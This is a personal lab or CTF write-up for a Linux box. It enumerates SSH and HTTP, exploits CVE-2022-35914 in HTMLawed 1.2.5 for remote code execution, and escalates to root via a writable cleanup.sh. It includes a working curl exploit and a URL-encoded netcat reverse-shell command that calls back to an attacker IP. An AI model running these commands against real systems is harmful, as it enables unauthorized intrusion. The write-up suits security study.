---
tags:
  - Linux
  - RCE
  - Privilege-Escalation
---
Difficulty: Intermediate
# Service Enumeration
With an initial scan of common ports, we see that we only have SSH and HTTP open. 
`nmap $ip -oN initial.nmap`

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

I'll start another scan to enumerate all ports which will continue in the background while I begin to enumerate ports 22 and 80. This scan also finishes with only the two ports listed above.
`nmap $ip -oN all.nmap -p-`

We have HTMLawed 1.2.5 Test, which allows us to provide some input for it to "process".
![[Pasted image 20250424062659.png]]

HTMLawed is a tool used to sanitize HTML to protect against XSS attacks. However, looking up this version, we'll find CVE-2022-35914, has CVSS of 9.8 and allows for RCE. 
https://nvd.nist.gov/vuln/detail/CVE-2022-35914

Searching on exploit-db, we'll find https://www.exploit-db.com/exploits/52023

The important part is just this curl command, which makes a POST request to the application including information such as our command and cleans up the output to display the relevant output. The important part of the curl command is that we're submitting POST data (-d) `sid=foo&hhook=exec&text=${CMD}` and a bearer token/cookie (-b) `sid=foo` to the URL.
 
```
curl -s -d "sid=foo&hhook=exec&text=${CMD}" -b "sid=foo" ${URL} | egrep '\&nbsp; \[[0-9]+\] =\>'| sed -E 's/\&nbsp; \[[0-9]+\] =\> (.*)<br \/>/\1/'
```

Running the script, as well as this command alone (with/without modifying sid to equal our actual cookie value) didn't return any command output. 

If we submit text on the webpage, we'll find that it makes the request to /htmLawedTest.php, which doesn't exist and causes the app to return a 404. I'll open the page in Burp and intercept the request, removing this filename from the path so that we're just making the post request to /. After forwarding this request, we'll find our command output.

![[Pasted image 20250424071319.png]]

I'll right click in the bottom left pane and send it to Repeater. I'll try to establish a reverse shell, so I'll start a listener on my attacking host: `sudo nc -lnvp 443` and then change the text parameter in my request body to the URL encoding of `nc -e /bin/sh <attacker ip> 443`. 
However, I still got inconsistent results

![[Pasted image 20250424072958.png]]

Seeing this, I decided to return to the curl command from earlier for simplicity, and modified it to remove the output parsing. It turns out those extra commands were cutting off the output, and the command actually was being executed and returned.

![[Pasted image 20250424072727.png]]

With my nc listener still running, executing the following gave me a reverse shell on the server as www-data:
`curl -s -d "sid=foo&hhook=exec&text=nc%20-e%20%2Fbin%2Fsh%20192.168.45.217%20443" -b "sid=foo" http://192.168.224.190/`

I found the flag, local.txt, in /var/www/html:
![[Pasted image 20250424073429.png]]

# Privilege Escalation

I'll take a moment to [stabilize my shell](https://darshan-2.gitbook.io/penetration-testing-checklist/reverse-shells/stabilizing-shell) and then begin looking for privilege escalation vectors.

`ls -al`

```
drwxr-xr-x  3 root     root     4096 Aug 25  2023 .
drwxr-xr-x 12 root     root     4096 Aug 24  2023 ..
-rwxr-xr-x  1 www-data www-data   82 Aug 25  2023 cleanup.sh
drwxr-xr-x  3 www-data www-data 4096 May 22 10:10 html
-rw-r--r--  1 www-data www-data   33 May 22 09:21 local.txt
```

cleanup.sh is writable by us... if it's ran as root we can use it to elevate our privileges. Sure enough, I was able to use this to gain access as root:

![[Pasted image 20250522080341.png]]

